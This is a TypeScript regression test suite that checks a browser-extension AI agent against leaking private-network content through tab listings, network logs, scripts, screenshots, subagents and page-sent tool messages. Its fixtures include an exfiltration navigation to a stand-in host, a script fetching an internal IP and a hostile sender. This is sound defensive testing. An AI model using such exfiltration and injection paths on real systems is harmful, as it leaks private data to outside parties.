import { buildAgentLoopContext } from '../../../packages/extension/background/agent/agent-loop/context.js';
import { handleMessage } from '../../../packages/extension/background/message-router.js';
import { getToolsForSession } from '../../../packages/extension/background/tools/tool-catalog.js';
import { handleSpawnSubagent } from '../../../packages/extension/background/tools/tool-executor/subagent.js';
import { type AsyncTestRunner, log } from '../shared/runner.js';
import {
  DEFAULT_SETTINGS,
  PUBLIC_IP,
  assertBlocked,
  observe,
  runTool,
  sessionTab,
  withGuardEnv,
} from './private-network-guard.integration.test.js';

// Issue #42 regression suite, part 2: indirect leak paths (tab metadata, network logs, arbitrary script, screenshots
// of the visible tab, approved local reads flowing to public forms, subagent tabs and unauthenticated tool messages).
export async function runPrivateNetworkLeakSuite(runner: AsyncTestRunner) {
  log('\n=== Integration: Private Network Leak Paths (issue #42) ===', 'info');

  await runner.test('tab listings and system-prompt context hide private tab titles and URLs', async () => {
    await withGuardEnv(async (env) => {
      env.fake.addTab({ id: 2, url: 'http://hr.example.net/salaries', active: false });
      observe('http://hr.example.net/salaries', '10.20.0.3', 2);
      sessionTab(env, 1, 'https://example.com/', PUBLIC_IP);
      env.tools.sessionTabs.set(2, {
        id: 2,
        url: 'http://hr.example.net/salaries',
        title: 'title of http://hr.example.net/salaries',
      });
      for (const tool of ['getTabs', 'describeSessionTabs']) {
        const result = await runTool(env, tool, {});
        runner.assertIncludes(JSON.stringify(result), 'example.com', `${tool} should still list public tabs`);
        runner.assertFalse(JSON.stringify(result).includes('hr.example.net'), `${tool} leaked a private tab`);
      }
      env.tools.currentSessionTabId = 2;
      const ctx = {
        getBrowserTools: () => env.tools,
        currentSessionId: env.sessionId,
        getToolsForSession: () => [],
      } as any;
      const context = await buildAgentLoopContext(ctx, DEFAULT_SETTINGS as any, {} as any, [], false, false);
      runner.assertFalse(JSON.stringify(context).includes('salaries'), 'system prompt context leaked a private tab');
    });
  });

  await runner.test('network logs withhold private responses and strip unverified bodies', async () => {
    await withGuardEnv(async (env) => {
      sessionTab(env, 1, 'https://example.com/', PUBLIC_IP);
      runner.assertTrue((await runTool(env, 'watchNetwork', {})).success !== false, 'watchNetwork should start');
      await env.fake.emitNetwork(1, 'r1', 'https://api.example.com/data', PUBLIC_IP, 'PUBLIC-BODY');
      await env.fake.emitNetwork(1, 'r2', 'http://printer.example.com/status', '127.0.0.1', 'PRIVATE-BODY');
      await env.fake.emitNetwork(1, 'r3', 'https://cdn.example.org/x', undefined, 'UNVERIFIED-BODY');
      const log = JSON.stringify(await runTool(env, 'getNetworkLog', { includeBody: true }));
      runner.assertIncludes(log, 'PUBLIC-BODY');
      runner.assertFalse(log.includes('PRIVATE-BODY') || log.includes('printer.example.com'), 'private entry leaked');
      runner.assertFalse(log.includes('UNVERIFIED-BODY'), 'unverified body leaked');
    });
  });

  await runner.test('evaluate is arbitrary code: hidden and refused unless explicitly enabled', async () => {
    await withGuardEnv(async (env) => {
      sessionTab(env, 1, 'https://example.com/', PUBLIC_IP);
      const script = 'return fetch("http://10.0.0.1/").then((r) => r.text())';
      assertBlocked(runner, await runTool(env, 'evaluate', { script }), 'content of', 'evaluate default');
      runner.assertFalse(getToolsForSession(env.tools, DEFAULT_SETTINGS).some((tool) => tool.name === 'evaluate'));
      const enabled = { ...DEFAULT_SETTINGS, toolPermissions: { ...DEFAULT_SETTINGS.toolPermissions, script: true } };
      runner.assertTrue(getToolsForSession(env.tools, enabled).some((tool) => tool.name === 'evaluate'));
      runner.assertTrue((await runTool(env, 'evaluate', { script }, enabled)).success !== false, 'opt-in evaluate');
    });
  });

  await runner.test('screenshots are judged by the tab that is actually visible', async () => {
    await withGuardEnv(async (env) => {
      sessionTab(env, 1, 'https://example.com/', PUBLIC_IP, false);
      env.fake.addTab({ id: 2, url: 'http://nas.example.net/photos', active: true });
      observe('http://nas.example.net/photos', '192.168.50.2', 2);
      const result = await runTool(env, 'screenshot', { tabId: 1 });
      runner.assertFalse(result.success !== false || 'dataUrl' in result, 'screenshot of a private visible tab');
    });
  });

  await runner.test('approved local hosts work, but their content cannot then be sent to public sites', async () => {
    await withGuardEnv(async (env) => {
      const approved = { ...DEFAULT_SETTINGS, allowedPrivateHosts: 'localhost:3000' };
      env.fake.addTab({ id: 2, url: 'https://forms.example.com/submit', active: false });
      env.tools.sessionTabs.set(2, { id: 2, url: 'https://forms.example.com/submit' });
      observe('https://forms.example.com/submit', PUBLIC_IP, 2);
      sessionTab(env, 1, 'http://localhost:3000/app', '127.0.0.1');
      const read = await runTool(env, 'getContent', {}, approved);
      runner.assertIncludes(JSON.stringify(read), 'content of http://localhost:3000/app', 'approved read');
      assertBlocked(
        runner,
        await runTool(env, 'type', { tabId: 2, selector: '#q', text: 'x' }, approved),
        'content of',
        'public write',
      );
      assertBlocked(
        runner,
        await runTool(env, 'navigate', { tabId: 1, url: 'https://exfil.example.com/?d=x' }, approved),
        '"success":true',
        'public nav',
      );
      runner.assertTrue(
        (await runTool(env, 'type', { tabId: 1, selector: '#q', text: 'x' }, approved)).success !== false,
        'local write',
      );
      const listed = { ...approved, allowedDomains: 'forms.example.com' };
      runner.assertTrue(
        (await runTool(env, 'type', { tabId: 2, selector: '#q', text: 'x' }, listed)).success !== false,
        'allowlisted write',
      );
    });
  });

  await runner.test('subagent tabs cannot be opened on private destinations', async () => {
    await withGuardEnv(async (env) => {
      const ctx = {
        getSessionState: () => ({ subAgentCount: 0, subAgentProfileCursor: 0, runningSubagents: new Map() }),
        getBrowserTools: () => env.tools,
      } as any;
      const runMeta = { sessionId: env.sessionId, runId: 'r', turnId: 't' };
      let result: unknown;
      try {
        result = await handleSpawnSubagent(
          ctx,
          runMeta,
          { url: 'http://192.168.0.1/admin', prompt: 'x' },
          DEFAULT_SETTINGS,
          async () => ({}),
        );
      } catch (error) {
        result = { thrown: String(error) };
      }
      runner.assertEqual(env.fake.createdUrls, [], `subagent tab opened: ${JSON.stringify(result)}`);
    });
  });

  await runner.test('direct tool-execution messages are refused from web-page senders', async () => {
    await withGuardEnv(async (env) => {
      sessionTab(env, 1, 'http://127.0.0.1/secret', '127.0.0.1');
      let calls = 0;
      const ctx = {
        currentSessionId: env.sessionId,
        getBrowserTools: () => {
          calls += 1;
          return env.tools;
        },
        sendToSidePanel: () => {},
      } as any;
      let response: any;
      const sender = { id: 'ext-id', url: 'https://evil.example.com/', tab: { id: 5 } } as any;
      await handleMessage(ctx, { type: 'execute_tool', tool: 'getContent', args: {} }, sender, (value) => {
        response = value;
      });
      runner.assertEqual(calls, 0, 'content-script sender reached tool execution');
      runner.assertFalse(JSON.stringify(response).includes('content of'), 'tool output leaked to sender');
    });
  });
}
